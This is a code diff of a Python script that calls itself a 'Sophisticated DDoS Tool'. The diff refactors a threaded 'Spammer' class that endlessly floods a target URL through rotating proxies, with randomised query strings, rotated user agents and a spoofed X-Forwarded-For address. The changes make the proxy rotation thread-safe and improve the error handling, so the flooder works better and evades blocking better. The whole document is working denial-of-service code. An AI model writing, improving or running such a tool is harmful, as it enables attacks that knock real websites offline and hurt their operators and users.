@@ -8226,11 +8226,12 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"	        			
 			]
 			
+
 # Spoofed client IP
 spoofed_ip = '1.3.3.9'
 
 class Spammer(threading.Thread):
-    def __init__(self, url, number, lista):
+    def __init__(self, url, number, proxy_list):
         threading.Thread.__init__(self)
         self.url = url + "?" + str(random.randint(0, 99999999)) + "=" + str(random.randint(0, 99999999))
         self.num = number
@@ -8247,17 +8248,20 @@ class Spammer(threading.Thread):
             'Upgrade-Insecure-Requests': '1',
             'X-Forwarded-For': spoofed_ip,
         }
-        self.Lock = threading.Lock()
-        self.lista = lista
+        self.proxy_list = proxy_list
+        self.lock = threading.Lock()
 
     def request(self):
         global N
         data = None
-        if N >= (len(self.lista) - 1):
-            N = 0
-        proxy = urllib.request.ProxyHandler({'http': self.lista[N]})
-        opener = urllib.request.build_opener(proxy)
+        with self.lock:  # Ensure atomic operation for N management
+            proxy = self.proxy_list[N]
+            N = (N + 1) % len(self.proxy_list)  # Rotate proxy index
+
+        proxy_handler = urllib.request.ProxyHandler({'http': proxy})
+        opener = urllib.request.build_opener(proxy_handler)
         urllib.request.install_opener(opener)
+        
         req = urllib.request.Request(self.url, data, self.headers)
         urllib.request.urlopen(req)
 
@@ -8266,25 +8270,23 @@ class Spammer(threading.Thread):
         print(Fore.RED + "0000000000000000000000000000")
         print(Style.RESET_ALL, end="")
 
-        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | {N:4d}/{len(self.lista)} | Proxy@{self.lista[N]}")
+        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | Proxy: {proxy}")
         sys.stdout.flush()
         sys.stdout.write("\r")
 
     def run(self):
-        global N
-        self.Lock.acquire()
-        print("Thread #%4d |" % self.num)
-        self.Lock.release()
+        self.lock.acquire()
+        print(f"Thread #{self.num:4d} | Starting")
+        self.lock.release()
         time.sleep(1)
         while True:
             try:
-                N += 1
                 self.request()
-            except:
-                pass
+            except Exception as e:
+                print(f"Error in thread #{self.num}: {e}")
         sys.exit(0)
 
-class MainLoop():
+class MainLoop:
     def __init__(self):
         if os.name in ("nt", "posix", "mac", "os2", "ce", "java", "riscos", "atheos", "amigaos", "beos", "uwin", "vms", "cygwin", "zos", "aix", "irix", "osf1", "hpux", "sunos", "freebsd", "openbsd", "netbsd", "darwin", "linux", "solaris", "haiku", "aros", "syllable", "skyos", "hurd", "minix", "android", "ios", "qnx", "blackberry", "webos", "windowsphone", "windowsce", "symbian", "microsoft", "dec", "sgi", "hp", "sun", "macintosh", "win32", "posix"):
             self.title()
@@ -8308,7 +8310,8 @@ class MainLoop():
         return url
 
     def setup(self):
-        global N, Close, Request, Tot_req
+        global N
+        N = 0
         while True:
             print(Fore.RED + "0000000000000000000000000000")
             print(Fore.YELLOW + "Sophisticated DDoS Tool")
@@ -8343,6 +8346,5 @@ class MainLoop():
             Spammer(url, i + 1, proxy_list).start()
 
 if __name__ == '__main__':
-    N = 0
     b = MainLoop()
     b.setup()
